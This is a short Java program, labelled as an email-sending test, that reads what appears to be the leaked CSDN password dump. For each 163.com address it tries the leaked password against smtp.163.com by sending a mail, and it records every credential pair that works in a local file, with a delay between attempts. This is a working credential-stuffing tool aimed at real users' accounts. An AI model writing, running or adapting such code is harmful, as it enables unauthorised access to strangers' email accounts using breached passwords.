package test;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.mail.EmailException;
import org.apache.log4j.Logger;

import com.sily.email.SendSimpleEmail;


public class EmailSendTest {

	public static void main(String[] args) {
		txtNoAtta();
	}
	
	public static void txtNoAtta(){
//		String config = PublishResourceBundle.getResourcesAbsolutePath("mail.properties");
//		SendSimpleEmail sse = new SendSimpleEmail("主题","文本内容");
//		sse.getInitDataByConfig("D:/我的桌面/mail.properties");
		try {
			BufferedReader br = new BufferedReader(new FileReader("F:/TDDOWNLOAD/www.csdn.net.sql"));
			String oneline = "";
			while((oneline = br.readLine()) != null){
				System.out.println(oneline);
				String ols[] = oneline.split("#");
				if(ols.length > 2){
					if(ols[2].indexOf("@")<2){
						continue;
					}
					String user = ols[2].trim().substring(0,ols[2].indexOf("@")-1);
//					String user = "wangxiaowev";
					String frommail = ols[2].trim();
					if(frommail.endsWith("163.com")){
						
						Thread.currentThread().sleep(1000*20);
						
						System.out.println(frommail);
						Map to =  new HashMap();
						to.put("Postmaster@163.com","Postmaster");
						Map from =  new HashMap();
						from.put(frommail,user);
//						from.put("wangxiaowev@163.com","wangxiaowev");
						String password = ols[1].trim();
//						String password = "wangxiaowei";
						SendSimpleEmail sse = new SendSimpleEmail("UTF-8", "smtp.163.com", user, password, to, from, "主题","文本内容");
						try {
							sse.send();
							System.out.println("rigth:" + frommail);
							FileWriter fw = new FileWriter("d:/我的桌面/163mial.txt",true);
							fw.write("username:"+ user + " = passwd:"+ password + "\r\n");
							fw.flush();
							fw.close();
						} catch (EmailException e) {
							Logger.getLogger("publish").error(e.getMessage(),e);
						}
					}
				}
			}
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
}
